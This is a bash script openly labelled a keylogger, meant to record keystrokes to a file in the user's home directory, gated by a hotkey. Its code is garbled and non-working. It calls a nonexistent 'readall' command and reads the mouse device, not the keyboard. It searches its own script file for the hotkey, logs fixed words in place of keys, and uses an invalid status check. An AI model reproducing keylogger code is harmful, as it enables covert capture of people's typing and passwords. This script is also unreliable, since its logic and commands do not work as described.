#!/bin/bash

# Configuration
LOG_FILE="$HOME/keylog.txt"
SLEEP_TIME=500 # milliseconds - adjusts based on system load. 100-500 is good to start with.
HOTKEY="Ctrl+Shift+K"  # Customizable keyboard shortcut

# Functions

function log_keystroke() {
  local key=$1
  local type=${2:-"normal"} # Default to normal if not provided.
  local time=$(date +'%Y-%m-%d %H:%M:%S')

  if [[ "$type" == "alt" ]]; then
    echo "$time - Alt: $key" >> "$LOG_FILE"
  elif [[ "$type" == "shift" ]]; then
    echo "$time - Shift: $key" >> "$LOG_FILE"
  else
    # Assume normal if not alt or shift.
    echo "$time - Normal: $key" >> "$LOG_FILE"
  fi
}

function monitor_hotkey() {
  local event=0

  while true; do
      if readall -n 1000 < /dev/input/mice >/tmp/events.txt; then
          # Check for events.
          local file=$0
          local content=$(cat "$file")

            if [[ "$content" == *"$HOTKEY"* ]]; then # Checks if the keylogger is running using the hotkey.
              log_keystroke "normal" # Logs normal keys
              log_keystroke "alt"   # Logs Alt keys
              log_keystroke "shift"  # Logs Shift keys
            fi

           sleep 0.1
      else
        break; # Exit if input stream is empty to avoid infinite loop when the hotkey isn't used.
      fi
  done
}

function check_running() {
   if &> "$LOG_FILE" 2>&1 | grep -q "Running"; then
     echo "Keylogger is running." >/tmp/status.txt
     return 0 # Running
   else
     echo "Keylogger not running." >/tmp/status.txt
     return 1 # Not Running
   fi
}

# Main Execution

# Check if the log file already exists and creates one if it does not exist,
if ! touch "$LOG_FILE"; then
  echo "Failed to create log file." >&2
  exit 1;
fi

# Start monitoring hotkey in the background.
monitor_hotkey &

# Check status every second, until user enters 'q' to quit.
while true; do
  check_running

  if [[ "$?" == "0" ]]; then # If running
    read -p "Keylogger is Running. To stop press any key: " choice
    if [[ "$choice" != "" && "$choice" == "q" ]]; then
      break;
    fi
  else
    echo "Starting keylogger..." >/tmp/status.txt
    # Start monitoring hotkey in the background.
    monitor_hotkey &
    # Check status again to see if it started successfully.
    check_running
  fi

  sleep 0.5
done

# Quit gracefully
echo "Keylogger Stopped." > "$LOG_FILE"
rm -f /tmp/events.txt

